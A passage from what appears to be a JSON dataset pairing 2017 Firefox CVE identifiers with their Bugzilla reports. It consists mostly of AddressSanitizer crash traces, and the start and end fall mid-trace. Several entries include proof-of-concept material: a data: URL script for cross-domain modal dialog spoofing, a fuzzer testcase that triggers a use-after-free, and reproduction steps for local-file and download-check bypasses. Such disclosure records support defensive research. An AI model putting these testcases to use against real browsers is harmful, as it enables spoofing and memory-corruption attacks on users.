0x7f3238cfc219 in mozilla::EventListenerManager::HandleEventSubType(mozilla::EventListenerManager::Listener*, nsIDOMEvent*, mozilla::dom::EventTarget*) /home/worker/workspace/build/src/dom/events/EventListenerManager.cpp:1141:51 #34 0x7f3238cfe2a4 in mozilla::EventListenerManager::HandleEventInternal(nsPresContext*, mozilla::WidgetEvent*, nsIDOMEvent**, mozilla::dom::EventTarget*, nsEventStatus*) /home/worker/workspace/build/src/dom/events/EventListenerManager.cpp:1311:20 #35 0x7f3238cddfa1 in mozilla::EventTargetChainItem::HandleEventTargetChain(nsTArray<mozilla::EventTargetChainItem>&, mozilla::EventChainPostVisitor&, mozilla::EventDispatchingCallback*, mozilla::ELMCreationDetector&) /home/worker/workspace/build/src/dom/events/EventDispatcher.cpp:464:16 #36 0x7f3238ce1472 in mozilla::EventDispatcher::Dispatch(nsISupports*, nsPresContext*, mozilla::WidgetEvent*, nsIDOMEvent*, nsEventStatus*, mozilla::EventDispatchingCallback*, nsTArray<mozilla::dom::EventTarget*>*) /home/worker/workspace/build/src/dom/events/EventDispatcher.cpp:824:9 #37 0x7f323afc4e6f in nsDocumentViewer::LoadComplete(nsresult) /home/worker/workspace/build/src/layout/base/nsDocumentViewer.cpp:1104:7 previously allocated by thread T0 (Web Content) here: #0 0x4bb9ec in malloc /builds/slave/moz-toolchain/src/llvm/projects/compiler-rt/lib/asan/asan_malloc_linux.cc:64:3 #1 0x4ecf0d in moz_xmalloc /home/worker/workspace/build/src/memory/mozalloc/mozalloc.cpp:83:17 #2 0x7f3239075493 in operator new /home/worker/workspace/build/src/obj-firefox/dist/include/mozilla/mozalloc.h:194:12 #3 0x7f3239075493 in NS_NewHTMLSpanElement(already_AddRefed<mozilla::dom::NodeInfo>&&, mozilla::dom::FromParser) /home/worker/workspace/build/src/dom/html/HTMLSpanElement.cpp:15 #4 0x7f32390fda92 in CreateHTMLElement /home/worker/workspace/build/src/dom/html/nsHTMLContentSink.cpp:287:41 #5 0x7f32390fda92 in NS_NewHTMLElement(mozilla::dom::Element**, already_AddRefed<mozilla::dom::NodeInfo>&&, mozilla::dom::FromParser, nsAString const*) /home/worker/workspace/build/src/dom/html/nsHTMLContentSink.cpp:258 #6 0x7f3236fc48c3 in NS_NewElement(mozilla::dom::Element**, already_AddRefed<mozilla::dom::NodeInfo>&&, mozilla::dom::FromParser, nsAString const*) /home/worker/workspace/build/src/dom/base/nsNameSpaceManager.cpp:183:12 #7 0x7f3236eb23bb in nsDocument::CreateElem(nsAString const&, nsIAtom*, int, nsAString const*) /home/worker/workspace/build/src/dom/base/nsDocument.cpp:8463:17 #8 0x7f323a8e6531 in mozilla::EditorBase::CreateHTMLContent(nsIAtom*) /home/worker/workspace/build/src/editor/libeditor/EditorBase.cpp:4720:15 #9 0x7f323a945bb8 in mozilla::HTMLEditor::CreateAnonymousElement(nsIAtom*, nsIDOMNode*, nsAString const&, bool) /home/worker/workspace/build/src/editor/libeditor/HTMLAnonymousNodeEditor.cpp:191:32 #10 0x7f323aa25f1c in CreateResizingInfo /home/worker/workspace/build/src/editor/libeditor/HTMLEditorObjectResizer.cpp:210:5 #11 0x7f323aa25f1c in mozilla::HTMLEditor::ShowResizersInner(nsIDOMElement*) /home/worker/workspace/build/src/editor/libeditor/HTMLEditorObjectResizer.cpp:350 #12 0x7f323a9480ee in ShowResizers /home/worker/workspace/build/src/editor/libeditor/HTMLEditorObjectResizer.cpp:283:17 #13 0x7f323a9480ee in mozilla::HTMLEditor::CheckSelectionStateForAnonymousButtons(nsISelection*) /home/worker/workspace/build/src/editor/libeditor/HTMLAnonymousNodeEditor.cpp:455 #14 0x7f323aa2185f in mozilla::ResizerSelectionListener::NotifySelectionChanged(nsIDOMDocument*, nsISelection*, short) /home/worker/workspace/build/src/editor/libeditor/HTMLEditorObjectResizer.cpp:93:19 #15 0x7f3236d40356 in mozilla::dom::Selection::NotifySelectionListeners() /home/worker/workspace/build/src/dom/base/Selection.cpp:3764:15 #16 0x7f323b1ddfc0 in NotifySelectionListeners /home/worker/workspace/build/src/layout/generic/nsFrameSelection.cpp:2069:23 #17 0x7f323b1ddfc0 in nsFrameSelection::EndBatchChanges(short) /home/worker/workspace/build/src/layout/generic/nsFrameSelection.cpp:2057 #18 0x7f3236d40b56 in mozilla::dom::Selection::EndBatchChangesInternal(short) /home/worker/workspace/build/src/dom/base/Selection.cpp:3792:21 #19 0x7f3236d3bf1b in ~SelectionBatcher /home/worker/workspace/build/src/dom/base/Selection.h:484:19 #20 0x7f3236d3bf1b in mozilla::dom::Selection::SelectAllChildren(nsINode&, mozilla::ErrorResult&) /home/worker/workspace/build/src/dom/base/Selection.cpp:3186 #21 0x7f3236d3c074 in mozilla::dom::Selection::SelectAllChildrenJS(nsINode&, mozilla::ErrorResult&) /home/worker/workspace/build/src/dom/base/Selection.cpp:3169:3 #22 0x7f3237b86365 in mozilla::dom::SelectionBinding::selectAllChildren(JSContext*, JS::Handle<JSObject*>, mozilla::dom::Selection*, JSJitMethodCallArgs const&) /home/worker/workspace/build/src/obj-firefox/dom/bindings/SelectionBinding.cpp:719:9 #23 0x7f32389358a0 in mozilla::dom::GenericBindingMethod(JSContext*, unsigned int, JS::Value*) /home/worker/workspace/build/src/dom/bindings/BindingUtils.cpp:3060:13 #24 0x7f323ef1d164 in CallJSNative /home/worker/workspace/build/src/js/src/jscntxtinlines.h:293:15 #25 0x7f323ef1d164 in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:470 #26 0x7f323ef05f8b in CallFromStack /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:521:12 #27 0x7f323ef05f8b in Interpret(JSContext*, js::RunState&) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:3060 #28 0x7f323eeecd08 in js::RunScript(JSContext*, js::RunState&) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:410:12 #29 0x7f323ef1d2fc in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:488:15 #30 0x7f323ef1dc52 in js::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, js::AnyInvokeArgs const&, JS::MutableHandle<JS::Value>) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:534:10 #31 0x7f323f8960cb in JS::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, JS::HandleValueArray const&, JS::MutableHandle<JS::Value>) /home/worker/workspace/build/src/js/src/jsapi.cpp:2948:12 #32 0x7f323837d2b5 in mozilla::dom::EventHandlerNonNull::Call(JSContext*, JS::Handle<JS::Value>, mozilla::dom::Event&, JS::MutableHandle<JS::Value>, mozilla::ErrorResult&) /home/worker/workspace/build/src/obj-firefox/dom/bindings/EventHandlerBinding.cpp:260:37 #33 0x7f3238d342b5 in Call<nsISupports *> /home/worker/workspace/build/src/obj-firefox/dist/include/mozilla/dom/EventHandlerBinding.h:362:12 #34 0x7f3238d342b5 in mozilla::JSEventHandler::HandleEvent(nsIDOMEvent*) /home/worker/workspace/build/src/dom/events/JSEventHandler.cpp:215 #35 0x7f3238cfc219 in mozilla::EventListenerManager::HandleEventSubType(mozilla::EventListenerManager::Listener*, nsIDOMEvent*, mozilla::dom::EventTarget*) /home/worker/workspace/build/src/dom/events/EventListenerManager.cpp:1141:51 #36 0x7f3238cfe2a4 in mozilla::EventListenerManager::HandleEventInternal(nsPresContext*, mozilla::WidgetEvent*, nsIDOMEvent**, mozilla::dom::EventTarget*, nsEventStatus*) /home/worker/workspace/build/src/dom/events/EventListenerManager.cpp:1311:20 #37 0x7f3238cddfa1 in mozilla::EventTargetChainItem::HandleEventTargetChain(nsTArray<mozilla::EventTargetChainItem>&, mozilla::EventChainPostVisitor&, mozilla::EventDispatchingCallback*, mozilla::ELMCreationDetector&) /home/worker/workspace/build/src/dom/events/EventDispatcher.cpp:464:16 #38 0x7f3238ce1472 in mozilla::EventDispatcher::Dispatch(nsISupports*, nsPresContext*, mozilla::WidgetEvent*, nsIDOMEvent*, nsEventStatus*, mozilla::EventDispatchingCallback*, nsTArray<mozilla::dom::EventTarget*>*) /home/worker/workspace/build/src/dom/events/EventDispatcher.cpp:824:9 SUMMARY: AddressSanitizer: heap-use-after-free /home/worker/workspace/build/src/dom/base/nsINode.h:1592:12 in GetBoolFlag Shadow bytes around the buggy address: 0x0c1a800031d0: 00 00 00 00 00 fa fa fa fa fa fa fa fa fa fd fd 0x0c1a800031e0: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fa 0x0c1a800031f0: fa fa fa fa fa fa fa fa fd fd fd fd fd fd fd fd 0x0c1a80003200: fd fd fd fd fd fd fd fd fd fa fa fa fa fa fa fa 0x0c1a80003210: fa fa 00 00 00 00 00 00 00 00 00 00 00 00 00 00 =>0x0c1a80003220: 00 00 00 00 fa fa fa fa fa fa fa fa fd fd fd[fd] 0x0c1a80003230: fd fd fd fd fd fd fd fd fd fd fd fd fd fa fa fa 0x0c1a80003240: fa fa fa fa fa fa 00 00 00 00 00 00 00 00 00 00 0x0c1a80003250: 00 00 00 00 00 00 00 fa fa fa fa fa fa fa fa fa 0x0c1a80003260: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd 0x0c1a80003270: fd fa fa fa fa fa fa fa fa fa fd fd fd fd fd fd Shadow byte legend (one shadow byte represents 8 application bytes): Addressable: 00 Partially addressable: 01 02 03 04 05 06 07 Heap left redzone: fa Heap right redzone: fb Freed heap region: fd Stack left redzone: f1 Stack mid redzone: f2 Stack right redzone: f3 Stack partial redzone: f4 Stack after return: f5 Stack use after scope: f8 Global redzone: f9 Global init order: f6 Poisoned by user: f7 Container overflow: fc Array cookie: ac Intra object redzone: bb ASan internal: fe Left alloca redzone: ca Right alloca redzone: cb ==16173==ABORTING"
      }
    ],
    "CVE-2017-7812": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1379842",
        "title": "Web content can open local files by hooking drag and drop to outside of content",
        "description": "separated from bug 1370843 and bug 1379838 (see bug 1379838 for details) (just in case, not adding related bugs to \"Blocks\" to avoid hint) Steps To Reproduce: 1. open Nightly with e10s enabled 2. open the attached HTML 3. select \"THIS\" text in the file 4. drag and drop the text to empty area of tabs bar Actual result: a new tab for local file is opened Expected result: maybe prevent it"
      }
    ],
    "CVE-2017-7813": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1383951",
        "title": "Out-of-bounds access in js::frontend::TokenStream::TokenBuf::getRawChar",
        "description": "Build ASAN JS Shell using funfuzz https://github.com/MozillaSecurity/funfuzz/tree/master/js funfuzz/js/compileShell.py -b \"--enable-debug --build-with-asan --build-with-clang --enable-more-deterministic -R /build/firefox/src\" ASAN:DEADLYSIGNAL ================================================================= ==145434==ERROR: AddressSanitizer: SEGV on unknown address 0x7ff600448408 (pc 0x0000022e7f6e bp 0x7fffd1a87d70 sp 0x7fffd1a87c20 T0) #0 0x22e7f6d in js::frontend::TokenStream::TokenBuf::getRawChar() build/firefox/src/js/src/frontend/TokenStream.h:971:20 #1 0x22e7f6d in js::frontend::TokenStream::getCharIgnoreEOL() build/firefox/src/js/src/frontend/TokenStream.cpp:532 #2 0x22e7f6d in js::frontend::TokenStream::putIdentInTokenbuf(char16_t const*) build/firefox/src/js/src/frontend/TokenStream.cpp:1189 #3 0x22ea1d2 in js::frontend::TokenStream::getTokenInternal(js::frontend::TokenKind*, js::frontend::Token::Modifier) build/firefox/src/js/src/frontend/TokenStream.cpp:1447:18 #4 0x676aef in js::frontend::TokenStream::peekToken(js::frontend::TokenKind*, js::frontend::Token::Modifier) build/firefox/src/js/src/frontend/TokenStream.h:781:14 #5 0x674b71 in js::frontend::Parser<js::frontend::FullParseHandler, char16_t>::statementListItem(js::frontend::YieldHandling, bool) build/firefox/src/js/src/frontend/Parser.cpp:7804:14 #6 0x66eb6e in js::frontend::Parser<js::frontend::FullParseHandler, char16_t>::statementList(js::frontend::YieldHandling) build/firefox/src/js/src/frontend/Parser.cpp:4199:21 #7 0x664475 in js::frontend::Parser<js::frontend::FullParseHandler, char16_t>::evalBody(js::frontend::EvalSharedContext*) build/firefox/src/js/src/frontend/Parser.cpp:2176:49 #8 0x19e214a in BytecodeCompiler::compileScript(JS::Handle<JSObject*>, js::frontend::SharedContext*) build/firefox/src/js/src/frontend/BytecodeCompiler.cpp:346:18 #9 0x19e5347 in BytecodeCompiler::compileEvalScript(JS::Handle<JSObject*>, JS::Handle<js::Scope*>) build/firefox/src/js/src/frontend/BytecodeCompiler.cpp:402:12 #10 0x19e84b6 in js::frontend::CompileEvalScript(JSContext*, js::LifoAlloc&, JS::Handle<JSObject*>, JS::Handle<js::Scope*>, JS::ReadOnlyCompileOptions const&, JS::SourceBufferHolder&, js::ScriptSourceObject**) build/firefox/src/js/src/frontend/BytecodeCompiler.cpp:601:12 #11 0x89e330 in EvalKernel(JSContext*, JS::Handle<JS::Value>, EvalType, js::AbstractFramePtr, JS::Handle<JSObject*>, unsigned char*, JS::MutableHandle<JS::Value>) build/firefox/src/js/src/builtin/Eval.cpp:316:30 #12 0x89f9a7 in js::DirectEval(JSContext*, JS::Handle<JS::Value>, JS::MutableHandle<JS::Value>) build/firefox/src/js/src/builtin/Eval.cpp:438:12 #13 0x7f0f60 in Interpret(JSContext*, js::RunState&) build/firefox/src/js/src/vm/Interpreter.cpp:2979:14 #14 0x7df993 in js::RunScript(JSContext*, js::RunState&) build/firefox/src/js/src/vm/Interpreter.cpp:410:12 #15 0x8187bb in js::ExecuteKernel(JSContext*, JS::Handle<JSScript*>, JSObject&, JS::Value const&, js::AbstractFramePtr, JS::Value*) build/firefox/src/js/src/vm/Interpreter.cpp:699:15 #16 0x8193b0 in js::Execute(JSContext*, JS::Handle<JSScript*>, JSObject&, JS::Value*) build/firefox/src/js/src/vm/Interpreter.cpp:731:12 #17 0x159a796 in ExecuteScript(JSContext*, JS::Handle<JSObject*>, JS::Handle<JSScript*>, JS::Value*) build/firefox/src/js/src/jsapi.cpp:4637:12 #18 0x159ac60 in JS_ExecuteScript(JSContext*, JS::Handle<JSScript*>) build/firefox/src/js/src/jsapi.cpp:4670:12 #19 0x5b12f7 in RunFile(JSContext*, char const*, _IO_FILE*, bool) build/firefox/src/js/src/shell/js.cpp:608:14 #20 0x5b12f7 in Process(JSContext*, char const*, bool, FileKind) build/firefox/src/js/src/shell/js.cpp:958 #21 0x557ad7 in ProcessArgs(JSContext*, js::cli::OptionParser*) build/firefox/src/js/src/shell/js.cpp:7753:14 #22 0x557ad7 in Shell(JSContext*, js::cli::OptionParser*, char**) build/firefox/src/js/src/shell/js.cpp:8118 #23 0x557ad7 in main build/firefox/src/js/src/shell/js.cpp:8515 #24 0x7ff60b236f44 in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x21f44) #25 0x47ae8c in _start (shell-cache/js-dbg-64-dm-clang-asan-linux-899590a34d56/js-dbg-64-dm-clang-asan-linux-899590a34d56+0x47ae8c) AddressSanitizer can not provide additional info. SUMMARY: AddressSanitizer: SEGV build/firefox/src/js/src/frontend/TokenStream.h:971:20 in js::frontend::TokenStream::TokenBuf::getRawChar() ==145434==ABORTING"
      }
    ],
    "CVE-2017-7814": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1376036",
        "title": "Application Reputation checks don't cover blob: and data: URLs",
        "description": "Steps to reproduce: 1. Download content.exe from https://testsafebrowsing.appspot.com/ (#2 under \"Desktop Download Warnings\") and unblock the file. 2. Upload it on https://p2p.dev.lcip.org/ 3. Copy and paste the resulting sharing link into the URL bar and click the download button. Expected: The file is blocked by download protection. (Chrome does this) Actual: The file is not blocked. This issue was discussed publicly on https://github.com/mozilla/something-awesome/issues/90 but without identifying it as a client bug. We should also think about how we should handle these schemes (if at all): - data: problematic since a remote lookup would send the content to Google (since the content is in the URL) - filesystem: ??? - about: skip? - javascript: skip?"
      }
    ],
    "CVE-2017-7815": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1368981",
        "title": "Firefox allows you to insert modal dialog in any domain",
        "description": "User Agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 Steps to reproduce: 1- Go to: data:text/html,<script>function loadIframe() {win = open('','_top');win.document.open();win.document.write('data:text/html,<s'+'cript>location=\"https://www.google.com\";</s'+'cript>');win.document.close();}function go() {var iframe = '<iframe onload=\"loadIframe();\"></iframe>';document.body.innerHTML = iframe; showModalDialog('https://www.firefox.com','','dialogWidth=600;dialogHeight=600');}</script><input type=\"button\" onclick=\"go()\" value=\"test\"/> 2- Click button Bug detected in Firefox browsers that do not use multi-process architecture or e10s Tested in: Firefox Nightly 55.0a1 (2017-05-17) (64-bit) Firefox Developer Edition 54.0a2 (2017-04-18) (32-bits) Firefox 53.0.2 (32-bit) Note: I consider that it is not a variant of the bug with id 1365875 because the showModalDialog method is not part of the three types of native popup boxes in javascript"
      }
    ],
    "CVE-2017-7816": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1380597",
        "title": "sidebarAction.setPopup is missing a URL security check",
        "description": "It used to be possible for extensions to load privileged about: pages in the sidebar with browser.sidebarAction.setPanel but now with OOP enabled they fail to load with the following errors: \"Error: You cannot use the AddonManager in child processes!\" \"Use of nsIFile in content process is deprecated.\""
      }
    ],
    "CVE-2017-7817": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1356596",
        "title": "Spoof page in full screen mode Firefox Android with \"scroll\"",
        "description": "User Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36 Steps to reproduce: 1.Go to http://laraweron.mysit.ru/poc.html 2.Scroll down the page 3.Click on the link Actual results: In the browser version Firefox for Android v52.02, when entering full-screen mode, absent notification. Under certain circumstances, an attacker can replace a page or address page in the browser.When we scroll down the page in the browser, the address bar is automatically hidden, if the full-screen mode is enabled in this mode, the user will not notice it. When you navigate to another page in your browser, an error occurs. Expected results: The browser opens a new window in full-screen mode, deleting the address bar. Verified by Mozilla Firefox 52.02 Android 4.22 Android 5.0.1"
      }
    ],
    "CVE-2017-7818": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1363723",
        "title": "heap-use-after-free in mozilla::a11y::DocAccessible::DoARIAOwnsRelocation",
        "description": "The following testcase crashes the latest ASAN build of Firefox. <script> function start() { fuzzPriv.enableAccessibility(); o0=document; o11=document.createElement('input'); o11.id='id2'; o0.designMode='on'; o291=document.createElement(\"div\"); o291.id=\"id2\"; document.documentElement.appendChild(o291); o627=document.createElementNS('http://www.w3.org/2000/svg','svg'); o688=document.createElementNS('http://www.w3.org/2000/svg','filter'); o707=document.createElementNS('http://www.w3.org/2000/svg','feComponentTransfer'); o688.appendChild(o707); o712=document.createElementNS('http://www.w3.org/2000/svg','feDisplacementMap'); o712.setAttribute('id','id4'); o688.appendChild(o712); o627.appendChild(o688); o817=document.createElement('iframe'); document.documentElement.appendChild(o627); document.documentElement.appendChild(o11); document.documentElement.appendChild(o817); o707.setAttribute('aria-owns','id2 id4'); o817.setAttribute('aria-owns','id4'); location.reload(); } </script> <body onload=\"start()\"></body> ASAN output: ================================================================= ==12988==ERROR: AddressSanitizer: heap-use-after-free on address 0x6020001bd7f0 at pc 0x7f4dbdc8cfaf bp 0x7ffff59e5d10 sp 0x7ffff59e5d08 READ of size 8 at 0x6020001bd7f0 thread T0 (Web Content) #0 0x7f4dbdc8cfae in Length /home/worker/workspace/build/src/obj-firefox/dist/include/nsTArray.h:398:37 #1 0x7f4dbdc8cfae in RefPtr<mozilla::a11y::Accessible>* nsTArray_Impl<RefPtr<mozilla::a11y::Accessible>, nsTArrayInfallibleAllocator>::InsertElementAt<mozilla::a11y::Accessible*&, nsTArrayInfallibleAllocator>(unsigned long, mozilla::a11y::Accessible*&) /home/worker/workspace/build/src/obj-firefox/dist/include/nsTArray.h:2133 #2 0x7f4dbdc8c880 in mozilla::a11y::DocAccessible::DoARIAOwnsRelocation(mozilla::a11y::Accessible*) /home/worker/workspace/build/src/accessible/generic/DocAccessible.cpp:2117:17 #3 0x7f4dbdbfc9ab in mozilla::a11y::NotificationController::WillRefresh(mozilla::TimeStamp) /home/worker/workspace/build/src/accessible/base/NotificationController.cpp:801:18 #4 0x7f4dbb64f2f5 in nsRefreshDriver::Tick(long, mozilla::TimeStamp) /home/worker/workspace/build/src/layout/base/nsRefreshDriver.cpp:1789:12 #5 0x7f4dbb65da33 in mozilla::RefreshDriverTimer::TickRefreshDrivers(long, mozilla::TimeStamp, nsTArray<RefPtr<nsRefreshDriver> >&) /home/worker/workspace/build/src/layout/base/nsRefreshDriver.cpp:300:7 #6 0x7f4dbb65d704 in mozilla::RefreshDriverTimer::Tick(long, mozilla::TimeStamp) /home/worker/workspace/build/src/layout/base/nsRefreshDriver.cpp:322:5 #7 0x7f4dbb65fd2b in RunRefreshDrivers /home/worker/workspace/build/src/layout/base/nsRefreshDriver.cpp:752:5 #8 0x7f4dbb65fd2b in mozilla::VsyncRefreshDriverTimer::RefreshDriverVsyncObserver::TickRefreshDriver(mozilla::TimeStamp) /home/worker/workspace/build/src/layout/base/nsRefreshDriver.cpp:665 #9 0x7f4dbb65f92f in mozilla::VsyncRefreshDriverTimer::RefreshDriverVsyncObserver::NotifyVsync(mozilla::TimeStamp) /home/worker/workspace/build/src/layout/base/nsRefreshDriver.cpp:566:9 #10 0x7f4dbbe7dd62 in mozilla::layout::VsyncChild::RecvNotify(mozilla::TimeStamp const&) /home/worker/workspace/build/src/layout/ipc/VsyncChild.cpp:67:16 #11 0x7f4db6152219 in mozilla::layout::PVsyncChild::OnMessageReceived(IPC::Message const&) /home/worker/workspace/build/src/obj-firefox/ipc/ipdl/PVsyncChild.cpp:155:20 #12 0x7f4db5e1dafd in mozilla::ipc::PBackgroundChild::OnMessageReceived(IPC::Message const&) /home/worker/workspace/build/src/obj-firefox/ipc/ipdl/PBackgroundChild.cpp:1541:28 #13 0x7f4db5d76ba4 in mozilla::ipc::MessageChannel::DispatchAsyncMessage(IPC::Message const&) /home/worker/workspace/build/src/ipc/glue/MessageChannel.cpp:2021:25 #14 0x7f4db5d73a37 in mozilla::ipc::MessageChannel::DispatchMessage(IPC::Message&&) /home/worker/workspace/build/src/ipc/glue/MessageChannel.cpp:1956:17 #15 0x7f4db5d75744 in mozilla::ipc::MessageChannel::RunMessage(mozilla::ipc::MessageChannel::MessageTask&) /home/worker/workspace/build/src/ipc/glue/MessageChannel.cpp:1825:5 #16 0x7f4db5d75d76 in mozilla::ipc::MessageChannel::MessageTask::Run() /home/worker/workspace/build/src/ipc/glue/MessageChannel.cpp:1858:15 #17 0x7f4db4fe3b40 in nsThread::ProcessNextEvent(bool, bool*) /home/worker/workspace/build/src/xpcom/threads/nsThread.cpp:1270:14 #18 0x7f4db4fe0588 in NS_ProcessNextEvent(nsIThread*, bool) /home/worker/workspace/build/src/xpcom/threads/nsThreadUtils.cpp:393:10 #19 0x7f4db5d7eb71 in mozilla::ipc::MessagePump::Run(base::MessagePump::Delegate*) /home/worker/workspace/build/src/ipc/glue/MessagePump.cpp:96:21 #20 0x7f4db5ce1f90 in RunInternal /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:238:10 #21 0x7f4db5ce1f90 in RunHandler /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:231 #22 0x7f4db5ce1f90 in MessageLoop::Run() /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:211 #23 0x7f4dbafbe58f in nsBaseAppShell::Run() /home/worker/workspace/build/src/widget/nsBaseAppShell.cpp:156:27 #24 0x7f4dbe5abf07 in XRE_RunAppShell() /home/worker/workspace/build/src/toolkit/xre/nsEmbedFunctions.cpp:893:22 #25 0x7f4db5ce1f90 in RunInternal /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:238:10 #26 0x7f4db5ce1f90 in RunHandler /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:231 #27 0x7f4db5ce1f90 in MessageLoop::Run() /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:211 #28 0x7f4dbe5aba35 in XRE_InitChildProcess(int, char**, XREChildData const*) /home/worker/workspace/build/src/toolkit/xre/nsEmbedFunctions.cpp:709:34 #29 0x4eb5c3 in content_process_main /home/worker/workspace/build/src/browser/app/../../ipc/contentproc/plugin-container.cpp:64:30 #30 0x4eb5c3 in main /home/worker/workspace/build/src/browser/app/nsBrowserApp.cpp:286 #31 0x7f4dd076582f in __libc_start_main /build/glibc-9tT8Do/glibc-2.23/csu/../csu/libc-start.c:291 #32 0x41cf18 in _start (/home/nils/fuzzer3/firefox/firefox+0x41cf18) 0x6020001bd7f0 is located 0 bytes inside of 8-byte region [0x6020001bd7f0,0x6020001bd7f8) freed by thread T0 (Web Content) here: #0 0x4bb44b in __interceptor_free /builds/slave/moz-toolchain/src/llvm/projects/compiler-rt/lib/asan/asan_malloc_linux.cc:47:3 #1 0x7f4db4ed633d in RawRemove /home/worker/workspace/build/src/xpcom/ds/PLDHashTable.cpp:661:3 #2 0x7f4db4ed633d in PLDHashTable::Remove(void const*) /home/worker/workspace/build/src/xpcom/ds/PLDHashTable.cpp:631 #3 0x7f4dbdc8d1ed in RemoveEntry /home/worker/workspace/build/src/obj-firefox/dist/include/nsTHashtable.h:171:12 #4 0x7f4dbdc8d1ed in Remove /home/worker/workspace/build/src/obj-firefox/dist/include/nsBaseHashtable.h:165 #5 0x7f4dbdc8d1ed in mozilla::a11y::DocAccessible::MoveChild(mozilla::a11y::Accessible*, mozilla::a11y::Accessible*, int) /home/worker/workspace/build/src/accessible/generic/DocAccessible.cpp:2199 #6 0x7f4dbdc8c7fd in mozilla::a11y::DocAccessible::DoARIAOwnsRelocation(mozilla::a11y::Accessible*) /home/worker/workspace/build/src/accessible/generic/DocAccessible.cpp:2115:9 #7 0x7f4dbdbfc9ab in mozilla::a11y::NotificationController::WillRefresh(mozilla::TimeStamp) /home/worker/workspace/build/src/accessible/base/NotificationController.cpp:801:18 #8 0x7f4dbb64f2f5 in nsRefreshDriver::Tick(long, mozilla::TimeStamp) /home/worker/workspace/build/src/layout/base/nsRefreshDriver.cpp:1789:12 #9 0x7f4dbb65da33 in mozilla::RefreshDriverTimer::TickRefreshDrivers(long, mozilla::TimeStamp, nsTArray<RefPtr<nsRefreshDriver> >&) /home/worker/workspace/build/src/layout/base/nsRefreshDriver.cpp:300:7 #10 0x7f4dbb65d704 in mozilla::RefreshDriverTimer::Tick(long, mozilla::TimeStamp) /home/worker/workspace/build/src/layout/base/nsRefreshDriver.cpp:322:5 #11 0x7f4dbb65fd2b in RunRefreshDrivers /home/worker/workspace/build/src/layout/base/nsRefreshDriver.cpp:752:5 #12 0x7f4dbb65fd2b in mozilla::VsyncRefreshDriverTimer::RefreshDriverVsyncObserver::TickRefreshDriver(mozilla::TimeStamp) /home/worker/workspace/build/src/layout/base/nsRefreshDriver.cpp:665 #13 0x7f4dbb65f92f in mozilla::VsyncRefreshDriverTimer::RefreshDriverVsyncObserver::NotifyVsync(mozilla::TimeStamp) /home/worker/workspace/build/src/layout/base/nsRefreshDriver.cpp:566:9 #14 0x7f4dbbe7dd62 in mozilla::layout::VsyncChild::RecvNotify(mozilla::TimeStamp const&) /home/worker/workspace/build/src/layout/ipc/VsyncChild.cpp:67:16 #15 0x7f4db6152219 in mozilla::layout::PVsyncChild::OnMessageReceived(IPC::Message const&) /home/worker/workspace/build/src/obj-firefox/ipc/ipdl/PVsyncChild.cpp:155:20 #16 0x7f4db5e1dafd in mozilla::ipc::PBackgroundChild::OnMessageReceived(IPC::Message const&) /home/worker/workspace/build/src/obj-firefox/ipc/ipdl/PBackgroundChild.cpp:1541:28 #17 0x7f4db5d76ba4 in mozilla::ipc::MessageChannel::DispatchAsyncMessage(IPC::Message const&) /home/worker/workspace/build/src/ipc/glue/MessageChannel.cpp:2021:25 #18 0x7f4db5d73a37 in mozilla::ipc::MessageChannel::DispatchMessage(IPC::Message&&) /home/worker/workspace/build/src/ipc/glue/MessageChannel.cpp:1956:17 #19 0x7f4db5d75744 in mozilla::ipc::MessageChannel::RunMessage(mozilla::ipc::MessageChannel::MessageTask&) /home/worker/workspace/build/src/ipc/glue/MessageChannel.cpp:1825:5 #20 0x7f4db5d75d76 in mozilla::ipc::MessageChannel::MessageTask::Run() /home/worker/workspace/build/src/ipc/glue/MessageChannel.cpp:1858:15 #21 0x7f4db4fe3b40 in nsThread::ProcessNextEvent(bool, bool*) /home/worker/workspace/build/src/xpcom/threads/nsThread.cpp:1270:14 #22 0x7f4db4fe0588 in NS_ProcessNextEvent(nsIThread*, bool) /home/worker/workspace/build/src/xpcom/threads/nsThreadUtils.cpp:393:10 #23 0x7f4db5d7eb71 in mozilla::ipc::MessagePump::Run(base::MessagePump::Delegate*) /home/worker/workspace/build/src/ipc/glue/MessagePump.cpp:96:21 #24 0x7f4db5ce1f90 in RunInternal /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:238:10 #25 0x7f4db5ce1f90 in RunHandler /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:231 #26 0x7f4db5ce1f90 in MessageLoop::Run() /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:211 #27 0x7f4dbafbe58f in nsBaseAppShell::Run() /home/worker/workspace/build/src/widget/nsBaseAppShell.cpp:156:27 #28 0x7f4dbe5abf07 in XRE_RunAppShell() 